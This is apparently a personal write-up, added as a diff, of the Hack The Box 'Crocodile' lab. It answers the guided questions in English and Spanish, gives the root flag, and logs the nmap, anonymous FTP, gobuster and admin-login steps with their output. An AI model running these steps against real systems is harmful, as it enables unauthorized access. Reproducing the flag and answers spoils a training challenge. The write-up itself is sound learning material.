@@ -1,0 +1,125 @@
+maquina crocodile htb
+resolucion
+10.129.111.178
+
+What nmap scanning switch employs the use of default scripts during a scan?
+ES
+
+¿Qué parametro de escaneo nmap emplea el uso de scripts predeterminados durante un escaneo?
+- -sC
+
+What service version is found to be running on port 21?
+ES
+que version del servicio encontramos corriendo en el puerto 21?
+- 21/tcp open  ftp     vsftpd 3.0.3
+
+What command can we use to download the files we find on the FTP server?
+ES
+Que comando se usa para descargar archivos de un servidor ftp?
+- get
+
+What is one of the higher-privilege sounding usernames in the list we retrieved?
+ES
+¿Cuál es uno de los nombres de usuario que suenan con mayor privilegio en la lista que recuperamos?
+- admin
+
+What version of Apache HTTP Server is running on the target host?
+ES
+Que version de apache HTTP Server esta corriendo en el host?
+- 2.4.41
+
+What is the name of a handy web site analysis plug-in we can install in our browser?
+ES
+¿Cuál es el nombre de un útil complemento de análisis de sitios web que podemos instalar en nuestro navegador?
+-Wappalayzer
+
+
+What switch can we use with gobuster to specify we are looking for specific filetypes?
+ES
+
+¿Qué parametro podemos usar con gobuster para especificar que estamos buscando tipos de archivos específicos?
+- -x
+
+What file have we found that can provide us a foothold on the target?
+ES
+¿Qué archivo hemos encontrado que pueda proporcionarnos un punto de apoyo en el objetivo?
+- login.php
+
+Submit root flag
+- c7110277ac44d78b6a9fff2232434d16
+
+cosas que he hecho
+
+primero un scan de nmap
+sudo nmap -n -Pn -sC -sV 10.129.111.178
+Nmap scan report for 10.129.111.178
+Host is up (0.17s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
+|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to ::ffff:10.10.15.113
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Smash - Bootstrap Business Template
+Service Info: OS: Unix
+
+luego entramos al ftp asi:
+ftp 10.129.111.178
+Connected to 10.129.111.178.
+220 (vsFTPd 3.0.3)
+Name (10.129.111.178:alex): anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+
+listamos directorios
+ftp> dir
+229 Entering Extended Passive Mode (|||42666|)
+150 Here comes the directory listing.
+-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
+-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
+226 Directory send OK.
+ftp> get allowed.userlist
+ y descargamos la lista de usuarios, lo mismo con la lista de contraseñas
+ftp> get allowed.userlist.passwd
+
+una vez la tenemos usamos gobuster de la siguiente manera, sintaxis
+❯ sudo gobuster dir --url http://10.129.111.178/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php, html
+
+gobuster dir --url taget -w el directorio del diccionario -x para las extensiones que queremos encontrar
+
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.129.111.178/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              ,php
+[+] Timeout:                 10s
+===============================================================
+2022/05/30 16:38:36 Starting gobuster in directory enumeration mode
+===============================================================
+/login.php            (Status: 200) [Size: 1577]
+
+entramos en la web en el apartado
+http://10.129.111.178/login.php
+introduciomos admin y contraseña y cogemos la flag
+
